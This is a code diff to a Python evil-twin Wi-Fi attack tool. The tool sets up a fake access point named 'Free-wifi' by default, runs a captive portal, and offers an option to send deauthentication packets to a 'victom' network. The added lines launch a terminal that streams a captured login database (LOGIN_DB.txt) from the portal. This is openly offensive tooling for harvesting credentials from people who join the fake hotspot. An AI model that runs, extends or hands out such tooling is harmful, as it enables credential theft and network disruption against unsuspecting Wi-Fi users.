@@ -18,6 +18,7 @@ os.system("sudo fuser -k 53/udp >/dev/null 2>&1 ")
 
 Curent_dir  = os.path.abspath(os.getcwd())
 user_name   = os.path.dirname(os.path.abspath(__file__)).split ("/")[2]
+
 def Check_Packages(): 
      list_Pakages = [
                      "  which dnsmasq      > /dev/unll 2>&1 ",
@@ -178,10 +179,17 @@ class Fake_access_point:
                   pass 
              if self.args.Portal:
                 from Snake_Package.Captive_Portal import Captive_Portal
-                run = Captive_Portal()
+                run = Captive_Portal()               
+                subprocess.call(["chmod +x "+Curent_dir+"/Snake_Package/ServerLog/Strem_db_read.py"],shell=True)
+                subprocess.call(["chmod +x "+Curent_dir+"/Snake_Package/ServerLog/read_errorLOG.py"],shell=True)
+                command_run = Curent_dir+"/Snake_Package/ServerLog/Strem_db_read.py"
+                command_proc3 = ' gnome-terminal  -e ' +'"' + command_run +'"'               
+                call_termminal = subprocess.call(command_proc3,shell=True,stderr=subprocess.PIPE)
+                group  = "chown "+ user_name+ ":"+user_name +  Curent_dir+"/Snake_Package/ServerLog/LOGIN_DB.txt" 
+                os.system(group)
       def args_Control(self):
             parser = argparse.ArgumentParser( description="Usage: <OPtion> <arguments> ")
-            parser.add_argument( '-I  ',"--Interface" ,metavar='' , action=None,required = True ,help="Interface act AP 'Support AP Mode'" )               
+            parser.add_argument( '-I  ',"--Interface" ,metavar='' , action=None,required = True ,help="Interface act AP 'Support AP Mode'" )                           
             parser.add_argument( '-S  ',"--Show", action='store_true' ,help="Show all access point around you [bssid-ssid-channel-sagenal]" )
             parser.add_argument( '-AP ',"--APName" ,metavar='' , action=None ,help = "Name of access point [ if not set the name option Defualit name is 'Free-wifi']")
             parser.add_argument( '-D  ',"--Deauth" ,metavar='' , action=None ,help = "send Deauth packet to the victom wifi [ airepay-ng ] ")
